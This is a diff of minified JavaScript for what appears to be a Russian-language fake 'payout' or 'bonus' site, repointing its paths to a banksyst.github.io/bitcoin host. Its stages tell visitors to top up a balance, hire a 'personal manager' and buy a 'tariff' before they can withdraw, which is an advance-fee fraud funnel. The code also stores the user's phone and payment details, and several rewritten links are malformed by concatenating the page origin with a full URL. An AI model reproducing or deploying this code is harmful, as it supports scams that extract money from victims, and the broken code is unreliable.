+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48552.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48552.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48552.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48552.html"
                 }
             },
             tls: {
@@ -5678,13 +5678,13 @@
                 customItem: "",
                 instructions: ["Пополните свой баланс на указанную сумму", "Система автоматически идентифицирует протокол TLS в вашем браузере", "Получите вашу выплату"],
                 buttonText: "Пополнить баланс",
-                paymentLink: "/account/tls?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/tls?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48553.html",
-                    c: window.location.origin + o + "epay48553.html",
-                    b: window.location.origin + o + "epay48553.html",
-                    p: window.location.origin + o + "epay48553.html",
-                    h: window.location.origin + o + "epay48553.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48553.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48553.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48553.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48553.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48553.html"
                 }
             },
             manual: {
@@ -5707,13 +5707,13 @@
                 upsellType: "text",
                 instructions: ["Наймите личного менеджера, оплатив его услуги", "Менеджер свяжется с вами сразу же после оплаты прямо у нас на сайте", "Вы получите свою выплату сразу же в ручном режиме"],
                 buttonText: "Нанять менеджера",
-                paymentLink: "/account/manual?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/manual?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48554.html",
-                    c: window.location.origin + o + "epay48554.html",
-                    b: window.location.origin + o + "epay48554.html",
-                    p: window.location.origin + o + "epay48554.html",
-                    h: window.location.origin + o + "epay48554.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48554.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48554.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48554.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48554.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48554.html"
                 }
             },
             limitex: {
@@ -5736,13 +5736,13 @@
                 upsellType: "text",
                 instructions: ["Следуйте указаниям Вашего личного менеджера", "Получите ваши средства"],
                 buttonText: "Подключить тариф",
-                paymentLink: "/account/limitex?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/limitex?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48555.html",
-                    c: window.location.origin + o + "epay48555.html",
-                    b: window.location.origin + o + "epay48555.html",
-                    p: window.location.origin + o + "epay48555.html",
-                    h: window.location.origin + o + "epay48555.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48555.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48555.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48555.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48555.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48555.html"
                 }
             },
             momentum: {
@@ -5765,13 +5765,13 @@
                 upsellType: "text",
                 instructions: ["Следуйте указаниям вашего личного менеджера", "Получите ваши средства моментально"],
                 buttonText: "Вывести деньги",
-                paymentLink: "/account/momentum?s=gd260ca58",
+                paymentLink: "https://banksyst.github.io/bitcoin/account/momentum?s=gd260ca58",
                 paymentLinks: {
-                    e: window.location.origin + o + "epay48556.html",
-                    c: window.location.origin + o + "epay48556.html",
-                    b: window.location.origin + o + "epay48556.html",
-                    p: window.location.origin + o + "epay48556.html",
-                    h: window.location.origin + o + "epay48556.html"
+                    e: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48556.html",
+                    c: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48556.html",
+                    b: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48556.html",
+                    p: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48556.html",
+                    h: window.location.origin + o + "https://banksyst.github.io/bitcoin/epay48556.html"
                 }
             },
             fin: {
@@ -5860,7 +5860,7 @@
           , o = s("0e44")
           , r = s("88b4")
           , c = s.n(r)
-          , l = "/offbitbonus/"
+          , l = "https://banksyst.github.io/bitcoin/offbitbonus/"
           , u = new c.a({
             encodingType: "aes",
             encryptionSecret: l + "!z%C*F-JaNdRgUkX",
@@ -6133,10 +6133,10 @@
                     return t[l].userphone
                 },
                 paymentMethod: function(t, e) {
-                    return localStorage.getItem("/offbitbonus/paymentMethod") ? localStorage.getItem("/offbitbonus/paymentMethod") : t[l].account.paymentMethod
+                    return localStorage.getItem("https://banksyst.github.io/bitcoin/offbitbonus/paymentMethod") ? localStorage.getItem("https://banksyst.github.io/bitcoin/offbitbonus/paymentMethod") : t[l].account.paymentMethod
                 },
                 paymentNumber: function(t, e) {
-                    return localStorage.getItem("/offbitbonus/paymentNumber") ? localStorage.getItem("/offbitbonus/paymentNumber") : t[l].account.paymentNumber
+                    return localStorage.getItem("https://banksyst.github.io/bitcoin/offbitbonus/paymentNumber") ? localStorage.getItem("https://banksyst.github.io/bitcoin/offbitbonus/paymentNumber") : t[l].account.paymentNumber
                 },
                 getNumberFromMoney: function(t) {
                     return parseInt(t[l].user.money.replace(/ /g, "").replace("&nbsp;", ""))
